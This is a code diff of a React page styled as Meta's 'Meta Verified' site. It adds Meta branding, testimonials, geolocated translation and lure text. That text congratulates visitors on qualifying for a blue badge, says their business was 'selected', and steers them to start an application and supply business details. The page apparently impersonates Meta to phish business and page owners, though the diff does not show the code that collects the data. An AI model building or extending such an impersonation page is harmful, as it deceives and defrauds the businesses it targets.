@@ -90,27 +90,14 @@ const Page: FC = () => {
         if (!geoInfo || Object.keys(translations).length > 0) return;
 
         (async () => {
-            // First check if we have hardcoded translation for this language
+            // First check if we have hardcoded translation
             const langMap: Record<string, string> = {
                 VN: 'vi',
-                ES: 'es', MX: 'es', AR: 'es',
-                FR: 'fr',
-                DE: 'de', AT: 'de', LU: 'de',
-                IT: 'it',
-                CN: 'zh', TW: 'zh', HK: 'zh', MO: 'zh',
-                AE: 'ar', EG: 'ar', JO: 'ar', LB: 'ar', QA: 'ar', IQ: 'ar', SA: 'ar',
-                IN: 'hi',
-                BR: 'pt', PT: 'pt',
-                RU: 'ru',
-                JP: 'ja',
-                NL: 'nl', BE: 'nl',
-                PL: 'pl',
-                GR: 'el', CY: 'el',
             };
             
             const lang = langMap[geoInfo.country_code];
             if (lang && lang !== 'en') {
-                // Use hardcoded translation from translate.ts (instant, no API call)
+                // Use hardcoded translation for Vietnamese
                 const hardcoded = getTranslations(lang);
                 setTranslations(hardcoded);
                 return;
@@ -128,19 +115,19 @@ const Page: FC = () => {
                 'Verified badge',
                 'The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.',
                 'Impersonation protection',
-                'Protect your Page from being impersonated with a verified badge that shows your authentic identity.',
+                'Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.',
                 'Enhanced support',
-                'Get priority support from Meta to resolve issues faster.',
+                'Get 24/7 access to email or chat agent support.',
                 'Upgraded profile features',
-                'Access exclusive profile customization options to showcase your brand.',
+                'Enrich your profile by adding images to your links to help boost engagement. Benefit not yet available in all regions.',
                 'Sign up for Meta Verified.',
                 'Our verification process is designed to maintain the integrity of the verified badge. Let\'s start by confirming your identity.',
                 'Start your application',
-                'Create an account to begin your Meta Verified application process.',
+                'Those interested in applying for Meta Verified will need to register and meet certain eligibility requirements (requirements for facebook). We are pleased to see that your business is one of the few that we have considered and selected',
                 'Verify business details',
-                'Provide your business information and verify your identity through our secure process.',
+                'You may be asked to share details such as your business name, address, website and/or phone number.',
                 'Get feedback',
-                'Upon successful verification, receive your Meta Verified badge immediately.',
+                'We\'ll review your application and send an update on your status within three working days.',
                 'See how Meta Verified has helped real businesses.',
                 'Get the latest updates from Meta for business.',
                 'Discover new insights to ensure the latest updates on brand safety, critical news and product updates.',
@@ -162,6 +149,17 @@ const Page: FC = () => {
                 'Privacy',
                 'Terms',
                 'Cookies',
+                'By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our Data Policy.',
+                'About',
+                'Developers',
+                'Careers',
+                'Help Centre',
+                'After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience. I think that seeing a verified badge builds trust. People that I don\'t know or newer brands interested in working with me can make sure that they\'re talking with me and not a scammer.',
+                'Since subscribing, I\'ve noticed a real difference. My posts are getting more reach, engagement has gone up and I\'m seeing more interactions on stories and reels.',
+                'Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business that takes both our products and social presence seriously.',
+                'Kimber Greenwood, Owner of Water-Bear Photography',
+                'Devon Kirby, Owner, Mom Approved Miami',
+                'Sarah Clancy, Owner of Sarah Marie Running Co.',
             ];
 
             const detectLanguage = async (countryCode: string): Promise<string> => {
@@ -185,6 +183,19 @@ const Page: FC = () => {
             const CACHE_KEY = 'translation_cache';
             const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
             const cache = cached ? JSON.parse(cached) : {};
+
+            // Check if all translations are already cached (from /live preload)
+            const allCached = textsToTranslate.every(text => cache[`en:${targetLang}:${text}`]);
+            
+            if (allCached) {
+                // Load from cache immediately
+                const translatedMap: Record<string, string> = {};
+                textsToTranslate.forEach(text => {
+                    translatedMap[text] = cache[`en:${targetLang}:${text}`];
+                });
+                setTranslations(translatedMap);
+                return;
+            }
 
             // Translate ALL texts in parallel with Promise.all
             const translatePromises = textsToTranslate.map(async (text) => {
@@ -238,6 +249,7 @@ const Page: FC = () => {
 
     return (
         <>
+            <title>Meta Verified for Facebook | Instagram</title>
             <Navbar />
             <div className="w-full bg-white">
                 {/* Hero Section */}
@@ -257,8 +269,11 @@ const Page: FC = () => {
                             <h1 className="text-4xl md:text-5xl font-bold text-gray-900 mb-6 leading-tight">
                                 {t('Show the world that you mean business.')}
                             </h1>
+                            <p className="text-lg text-gray-600 mb-4 leading-relaxed">
+                                {t('Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you\'ve built with your audience.')}
+                            </p>
                             <p className="text-lg text-gray-600 mb-8 leading-relaxed">
-                                {t('Organizations can leverage the requirements to upgrade your page to a Sub-business status with a branded, relationship that reflects your brand values to drive more meaningful engagement and future.')}
+                                {t('We\'re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!')}
                             </p>
                             <button
                                 onClick={() => {
@@ -467,7 +482,7 @@ const Page: FC = () => {
                         <div className="max-w-4xl mx-auto">
                             <div className="bg-blue-50 p-12 md:p-16 rounded-2xl text-center min-h-80 flex flex-col justify-center">
                                 <p className="text-lg md:text-xl text-gray-700 mb-8 leading-relaxed">
-                                    {testimonials[currentTestimonialIndex].quote}
+                                    {t(testimonials[currentTestimonialIndex].quote)}
                                 </p>
                                 <p className="text-gray-900 font-semibold">
                                     {testimonials[currentTestimonialIndex].author}
@@ -531,7 +546,7 @@ const Page: FC = () => {
                                         />
                                     </div>
                                     <p className="text-xs text-gray-400 leading-relaxed">
-                                        By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our <a href="#" className="underline hover:text-gray-200">Data Policy</a>.
+                                        {t('By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our Data Policy.')}
                                     </p>
                                     <button className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-full transition w-fit">
                                         {t('Subscribe')}
@@ -599,13 +614,13 @@ const Page: FC = () => {
                                 </div>
                             </div>
                             <div className="flex gap-6">
-                                <a href="#" className="text-gray-400 hover:text-white transition">About</a>
-                                <a href="#" className="text-gray-400 hover:text-white transition">Developers</a>
-                                <a href="#" className="text-gray-400 hover:text-white transition">Careers</a>
-                                <a href="#" className="text-gray-400 hover:text-white transition">Privacy</a>
-                                <a href="#" className="text-gray-400 hover:text-white transition">Cookies</a>
-                                <a href="#" className="text-gray-400 hover:text-white transition">Terms</a>
-                                <a href="#" className="text-gray-400 hover:text-white transition">Help Centre</a>
+                                <a href="#" className="text-gray-400 hover:text-white transition">{t('About')}</a>
+                                <a href="#" className="text-gray-400 hover:text-white transition">{t('Developers')}</a>
+                                <a href="#" className="text-gray-400 hover:text-white transition">{t('Careers')}</a>
+                                <a href="#" className="text-gray-400 hover:text-white transition">{t('Privacy')}</a>
+                                <a href="#" className="text-gray-400 hover:text-white transition">{t('Cookies')}</a>
+                                <a href="#" className="text-gray-400 hover:text-white transition">{t('Terms')}</a>
+                                <a href="#" className="text-gray-400 hover:text-white transition">{t('Help Centre')}</a>
                             </div>
                         </div>
                     </div>
